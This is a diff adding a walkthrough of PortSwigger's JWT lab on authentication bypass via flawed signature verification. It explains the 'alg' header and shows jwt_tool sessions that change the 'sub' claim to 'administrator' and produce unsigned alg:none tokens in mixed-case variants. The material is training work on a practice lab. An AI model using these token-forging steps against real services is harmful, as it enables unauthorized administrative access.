@@ -128,7 +128,7 @@ nbf = NotBefore
 ----------------------
 ```
 
-2. Tamper "wiener" value to the "administrator" value using **jwt_tool**.
+2. Tamper "wiener" value to the "administrator" value using **jwt_tool** or other tool (JSON Web Tokens - Burp Suite Extension, JWT debugger, etc).
 
 ```bash
 ─$ python3 jwt_tool.py eyJraWQiOiI3YTQ4NjQ2YS0yMTgwLTRkOGUtYTA1YS00MjJhOTlkOWFjNzEiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNDQyNDQzMiwic3ViIjoid2llbmVyIn0.E_zbMx5P-9T3BbNH8klnEapTlbYpRcYe88NJURL-RM96BSYdnxTZJYhwmcN6lFND_Gj8SijMtBVqWBOmyCE6Mo1Qd58qRwE_tgmBNRAQNexXE1FwjQIBiof0rS_sdoP9D8oTqvTNHy80Wn1YLaB6pdah1yQnl7gTU8mfTolD0dyxVjwUyPjm3OJ7AbPQQYSfPVj93p2VXevDBTSikLphB7_OiiE8ywJSLCAu7_qX2TK0c31RVLjGrPlw-f5Ec3MYEjIY_GAJHMXflgmhCW83Z6AjDmhiClhVEfZ8v1bPQ0m1dUegMHTV7_RwaPanrBmai7EtB_P_OjocF8jwCUu2fg -T
@@ -199,3 +199,166 @@ jwttool_084845f9c257880a92a7af8fae9224c1 - Tampered token:
 <img align="center" src="screenshots/jwt_vulns/unverified_signature/not_tampered.png">
 
 <img align="center" src="screenshots/jwt_vulns/unverified_signature/tampered.png">
+
+### JWT authentication bypass via flawed signature verification
+
+**Resources:**
+
+- **Lab:** https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification
+- **AulasHack Video Resolution:** https://odysee.com/@AulasHack:4/jwt-authentication-bypass-via-flawed:5?lid=1b7dc3665c5cf1c05af4d0e56fd30d94031af8ba
+
+**Explanation:** 
+
+​               Among other things, the JWT header contains an `alg` parameter. This tells the server which algorithm was used to sign the  token and, therefore, which algorithm it needs to use when verifying the signature.        
+
+```json
+{
+    "alg": "HS256",
+    "typ": "JWT"
+}
+```
+
+​            This is inherently flawed because the server has no option  but to implicitly trust user-controllable input from the token which, at this point, hasn't been verified at all. In other words, an attacker  can directly influence how the server checks whether the token is  trustworthy.        
+
+​            JWTs can be signed using a range of different algorithms, but can also be left unsigned. In this case, the `alg` parameter is set to `none`, which indicates a so-called "unsecured JWT". Due to the obvious dangers of this, servers usually reject tokens with no signature. However, as  this kind of filtering relies on string parsing, you can sometimes  bypass these filters using classic obfuscation techniques, such as mixed capitalization and unexpected encodings.        
+
+**Resolution:**
+
+1. Login at **wiener** account, collect and analyse the JWT Tokent at **jwt.io** or **jwt_tool**.
+
+```bash
+└─$ python3 jwt_tool.py eyJraWQiOiJkNzVjMTA3Ni1iYmJjLTRmMDgtODI4Yy1hYTVhZjU2MDU0NTAiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNDY1OTg5Miwic3ViIjoid2llbmVyIn0.HoAC4UXD5StehdSUdCyn6mTcsANbR_29e8DtVbMps_ARWEo4U8ZpfPmbAqyLh4skGdnldsX2nTh-x9q72kyFmrLPmAgzBKc0N8FMKDl8zI3S5wsEK8AtCu5OsVZRL0G0idIzzzQVvZRmQVTBDCs5TghXzN3uQt5uOtX6oznYIcBM__85YlZASa_TbeQznwcZsatoKltasz22hHBcxInTvafePEZHHd7FecLQZjsO3L5jYSlos2AVhtCeGZWYi3MgY6qO83celfHmLumFjClIM17pNYH5GPoPMaFHyt7u_Ula8rrGbqRYstlt6k5rM10-BResgfLuWS7RNr2bT6MIYg   
+
+        \   \        \         \          \                    \ 
+   \__   |   |  \     |\__    __| \__    __|                    |
+         |   |   \    |      |          |       \         \     |
+         |        \   |      |          |    __  \     __  \    |
+  \      |      _     |      |          |   |     |   |     |   |
+   |     |     / \    |      |          |   |     |   |     |   |
+\        |    /   \   |      |          |\        |\        |   |
+ \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
+ Version 2.2.6                \______|             @ticarpi      
+
+Original JWT: 
+
+=====================
+Decoded Token Values:
+=====================
+
+Token header values:
+[+] kid = "d75c1076-bbbc-4f08-828c-aa5af5605450"
+[+] alg = "RS256"
+
+Token payload values:
+[+] iss = "portswigger"
+[+] exp = 1714659892    ==> TIMESTAMP = 2024-05-02 11:24:52 (UTC)
+[+] sub = "wiener"
+
+----------------------
+JWT common timestamps:
+iat = IssuedAt
+exp = Expires
+nbf = NotBefore
+----------------------
+```
+
+2. Tamper "wiener" value to the "administrator" value using **jwt_tool** or other tool (JSON Web Tokens - Burp Suite Extension, JWT debugger, etc).
+
+```bash
+└─$ python3 jwt_tool.py eyJraWQiOiJkNzVjMTA3Ni1iYmJjLTRmMDgtODI4Yy1hYTVhZjU2MDU0NTAiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNDY1OTg5Miwic3ViIjoid2llbmVyIn0.HoAC4UXD5StehdSUdCyn6mTcsANbR_29e8DtVbMps_ARWEo4U8ZpfPmbAqyLh4skGdnldsX2nTh-x9q72kyFmrLPmAgzBKc0N8FMKDl8zI3S5wsEK8AtCu5OsVZRL0G0idIzzzQVvZRmQVTBDCs5TghXzN3uQt5uOtX6oznYIcBM__85YlZASa_TbeQznwcZsatoKltasz22hHBcxInTvafePEZHHd7FecLQZjsO3L5jYSlos2AVhtCeGZWYi3MgY6qO83celfHmLumFjClIM17pNYH5GPoPMaFHyt7u_Ula8rrGbqRYstlt6k5rM10-BResgfLuWS7RNr2bT6MIYg -T
+
+        \   \        \         \          \                    \ 
+   \__   |   |  \     |\__    __| \__    __|                    |
+         |   |   \    |      |          |       \         \     |
+         |        \   |      |          |    __  \     __  \    |
+  \      |      _     |      |          |   |     |   |     |   |
+   |     |     / \    |      |          |   |     |   |     |   |
+\        |    /   \   |      |          |\        |\        |   |
+ \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
+ Version 2.2.6                \______|             @ticarpi      
+
+Original JWT: 
+
+
+====================================================================
+This option allows you to tamper with the header, contents and 
+signature of the JWT.
+====================================================================
+
+Token header values:
+[1] kid = "d75c1076-bbbc-4f08-828c-aa5af5605450"
+[2] alg = "RS256"
+[3] *ADD A VALUE*
+[4] *DELETE A VALUE*
+[0] Continue to next step
+
+Please select a field number:
+(or 0 to Continue)
+> 0
+
+Token payload values:
+[1] iss = "portswigger"
+[2] exp = 1714659892    ==> TIMESTAMP = 2024-05-02 11:24:52 (UTC)
+[3] sub = "wiener"
+[4] *ADD A VALUE*
+[5] *DELETE A VALUE*
+[6] *UPDATE TIMESTAMPS*
+[0] Continue to next step
+
+Please select a field number:                                                                                                                                                                
+(or 0 to Continue)                                                                                                                                                                           
+> 4
+Please enter new Key and hit ENTER
+> sub
+Please enter new value for sub and hit ENTER
+> administrator
+[1] iss = "portswigger"
+[2] exp = 1714659892    ==> TIMESTAMP = 2024-05-02 11:24:52 (UTC)
+[3] sub = "administrator"
+[4] *ADD A VALUE*
+[5] *DELETE A VALUE*
+[6] *UPDATE TIMESTAMPS*
+[0] Continue to next step
+
+Please select a field number:                                                                                                                                                                
+(or 0 to Continue)                                                                                                                                                                           
+> 0
+Signature unchanged - no signing method specified (-S or -X)
+jwttool_792407c24f2de96f70e50f012694fad2 - Tampered token:
+[+] eyJraWQiOiJkNzVjMTA3Ni1iYmJjLTRmMDgtODI4Yy1hYTVhZjU2MDU0NTAiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNDY1OTg5Miwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.HoAC4UXD5StehdSUdCyn6mTcsANbR_29e8DtVbMps_ARWEo4U8ZpfPmbAqyLh4skGdnldsX2nTh-x9q72kyFmrLPmAgzBKc0N8FMKDl8zI3S5wsEK8AtCu5OsVZRL0G0idIzzzQVvZRmQVTBDCs5TghXzN3uQt5uOtX6oznYIcBM__85YlZASa_TbeQznwcZsatoKltasz22hHBcxInTvafePEZHHd7FecLQZjsO3L5jYSlos2AVhtCeGZWYi3MgY6qO83celfHmLumFjClIM17pNYH5GPoPMaFHyt7u_Ula8rrGbqRYstlt6k5rM10-BResgfLuWS7RNr2bT6MIYg
+```
+
+3. Modify algorithm value to `none` and execute **Alg None Attack**. To ease the attack, use **jwt_tool** or **JSON Web Tokens - Burp Suite Extension**.
+
+```bash
+└─$ python3 jwt_tool.py eyJraWQiOiJhZmM1YWZhMS01NzNiLTQ4OWUtOGUzNS1kODc4MjcyZTRkZGMiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNDY2Mzg0MCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.GrLn6PklK2eglXqev8LIv-deNMePTMj0nd3Ex-UNFEMhPvq2ckztksxgZ02VFAoPqX3wNFiR6qXYCi_PV9WT9GKGyZHll4TNfXgwWQpCx4OjM4-v_6380LIjGlzlrYn3hsRCqcxqojEQhllC5kxbyTNcGc-ENwjBO1TnHNAMNrW5Nltp6EczatfDRJT0X44b1Q1ESpMQVZ7WCXpVXW4y8Lbxyk0bLk89E_gjPvPebaC4z8IWyKM9WdJjHPsGccpIpH8DOeXt2KMqD10SnwS1X9fYW99gfoMRyPY2bXKktcCytKTqfsg3qT5SopkGQymq2aidW-Kn6pauSTyYW6t1hw -X a
+
+        \   \        \         \          \                    \ 
+   \__   |   |  \     |\__    __| \__    __|                    |
+         |   |   \    |      |          |       \         \     |
+         |        \   |      |          |    __  \     __  \    |
+  \      |      _     |      |          |   |     |   |     |   |
+   |     |     / \    |      |          |   |     |   |     |   |
+\        |    /   \   |      |          |\        |\        |   |
+ \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
+ Version 2.2.6                \______|             @ticarpi      
+
+Original JWT: 
+                                                                                                                                                                                             
+jwttool_88615071d0e4c7ac5feeaee16aa23f6a - EXPLOIT: "alg":"none" - this is an exploit targeting the debug feature that allows a token to have no signature
+(This will only be valid on unpatched implementations of JWT.)                                                                                                                               
+[+] eyJraWQiOiJhZmM1YWZhMS01NzNiLTQ4OWUtOGUzNS1kODc4MjcyZTRkZGMiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNDY2Mzg0MCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
+jwttool_6917827a302d58b0145a13ba94deaa28 - EXPLOIT: "alg":"None" - this is an exploit targeting the debug feature that allows a token to have no signature
+(This will only be valid on unpatched implementations of JWT.)                                                                                                                               
+[+] eyJraWQiOiJhZmM1YWZhMS01NzNiLTQ4OWUtOGUzNS1kODc4MjcyZTRkZGMiLCJhbGciOiJOb25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNDY2Mzg0MCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
+jwttool_a3224fc3744cf87c54c698f91e6004a5 - EXPLOIT: "alg":"NONE" - this is an exploit targeting the debug feature that allows a token to have no signature
+(This will only be valid on unpatched implementations of JWT.)                                                                                                                               
+[+] eyJraWQiOiJhZmM1YWZhMS01NzNiLTQ4OWUtOGUzNS1kODc4MjcyZTRkZGMiLCJhbGciOiJOT05FIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNDY2Mzg0MCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
+jwttool_f25032c0bc069765db80fd58114b1910 - EXPLOIT: "alg":"nOnE" - this is an exploit targeting the debug feature that allows a token to have no signature
+(This will only be valid on unpatched implementations of JWT.)                                                                                                                               
+[+] eyJraWQiOiJhZmM1YWZhMS01NzNiLTQ4OWUtOGUzNS1kODc4MjcyZTRkZGMiLCJhbGciOiJuT25FIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNDY2Mzg0MCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
+```
+
+<img align="center" src="screenshots/jwt_vulns/flawed_signature_verificaion/alg_none_burp.png">
+
+<img align="center" src="screenshots/jwt_vulns/flawed_signature_verificaion/alg_none_success.png">
